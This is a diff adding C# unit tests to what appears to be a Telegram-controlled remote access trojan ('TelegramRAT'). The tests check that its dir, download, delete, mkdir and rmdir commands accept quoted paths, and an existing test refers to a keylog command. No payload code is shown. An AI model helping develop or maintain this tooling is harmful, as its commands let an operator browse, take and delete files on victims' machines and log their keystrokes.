@@ -88,6 +88,21 @@ public class CommandRegistryTests
             }
         };
 
+    private static BotCommandModel CreateModelWithRawArgs(string command, string rawArgs, string[] args)
+        => new()
+        {
+            Command = command,
+            Args = args,
+            RawArgs = rawArgs,
+            Message = new Message
+            {
+                Chat = new Chat { Id = 123 },
+                From = new User { Id = 321, FirstName = "tester" },
+                MessageId = 7,
+                Date = DateTime.UtcNow
+            }
+        };
+
     [Fact]
     public async Task KeylogCommand_WhenAlreadyActive_TogglesOffWithoutRequests()
     {
@@ -200,6 +215,166 @@ public class CommandRegistryTests
         {
             Directory.SetCurrentDirectory(originalDirectory);
 
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task DirCommand_UsesSanitizedPathForQuotedInput()
+    {
+        var sentMessages = new List<string>();
+        var botMock = CreateBotMock(sentMessages);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "dir");
+
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        var targetDirectory = Path.Combine(tempRoot, "My Folder");
+        Directory.CreateDirectory(targetDirectory);
+        var fileName = "file with spaces.txt";
+        File.WriteAllText(Path.Combine(targetDirectory, fileName), "content");
+
+        try
+        {
+            var model = CreateModelWithRawArgs("dir", $"\"{targetDirectory}\"", new[] { targetDirectory });
+
+            await command.Execute(model);
+
+            Assert.NotEmpty(sentMessages);
+            Assert.Contains(fileName, string.Join(Environment.NewLine, sentMessages));
+        }
+        finally
+        {
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task DownloadCommand_UsesSanitizedPathForQuotedInput()
+    {
+        var sentMessages = new List<string>();
+        var sentDocuments = new List<SendDocumentRequest>();
+        var botMock = CreateBotMock(sentMessages, sentDocuments);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "download");
+
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        var targetFile = Path.Combine(tempRoot, "Folder With Spaces", "file with spaces.txt");
+        Directory.CreateDirectory(Path.GetDirectoryName(targetFile)!);
+        File.WriteAllText(targetFile, "content");
+
+        try
+        {
+            var model = CreateModelWithRawArgs("download", $"\"{targetFile}\"", new[] { targetFile });
+
+            await command.Execute(model);
+
+            Assert.Empty(sentMessages);
+            var documentRequest = Assert.Single(sentDocuments);
+            Assert.Equal(targetFile, documentRequest.Caption);
+        }
+        finally
+        {
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task DeleteCommand_UsesSanitizedPathForQuotedInput()
+    {
+        var sentMessages = new List<string>();
+        var botMock = CreateBotMock(sentMessages);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "delete");
+
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        Directory.CreateDirectory(tempRoot);
+        var targetFile = Path.Combine(tempRoot, "file with spaces.txt");
+        File.WriteAllText(targetFile, "content");
+
+        try
+        {
+            var model = CreateModelWithRawArgs("delete", $"\"{targetFile}\"", new[] { targetFile });
+
+            await command.Execute(model);
+
+            Assert.False(File.Exists(targetFile));
+            Assert.Contains("Done!", sentMessages);
+        }
+        finally
+        {
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task MkdirCommand_UsesSanitizedPathForQuotedInput()
+    {
+        var sentMessages = new List<string>();
+        var botMock = CreateBotMock(sentMessages);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "mkdir");
+
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        var targetDirectory = Path.Combine(tempRoot, "My Folder");
+
+        try
+        {
+            var model = CreateModelWithRawArgs("mkdir", $"\"{targetDirectory}\"", new[] { targetDirectory });
+
+            await command.Execute(model);
+
+            Assert.True(Directory.Exists(targetDirectory));
+            Assert.Contains("Done!", sentMessages);
+        }
+        finally
+        {
+            if (Directory.Exists(tempRoot))
+                Directory.Delete(tempRoot, recursive: true);
+        }
+    }
+
+    [Fact]
+    public async Task RmdirCommand_UsesSanitizedPathForQuotedInput()
+    {
+        var sentMessages = new List<string>();
+        var botMock = CreateBotMock(sentMessages);
+        Program.SetBotClient(botMock.Object);
+
+        var commands = new List<BotCommand>();
+        CommandRegistry.InitializeCommands(commands);
+        var command = commands.Single(c => c.Command == "rmdir");
+
+        var tempRoot = Path.Combine(Path.GetTempPath(), "TelegramRAT Tests", Guid.NewGuid().ToString());
+        var targetDirectory = Path.Combine(tempRoot, "My Folder");
+        Directory.CreateDirectory(targetDirectory);
+
+        try
+        {
+            var model = CreateModelWithRawArgs("rmdir", $"\"{targetDirectory}\"", new[] { targetDirectory });
+
+            await command.Execute(model);
+
+            Assert.False(Directory.Exists(targetDirectory));
+            Assert.Empty(sentMessages);
+        }
+        finally
+        {
             if (Directory.Exists(tempRoot))
                 Directory.Delete(tempRoot, recursive: true);
         }
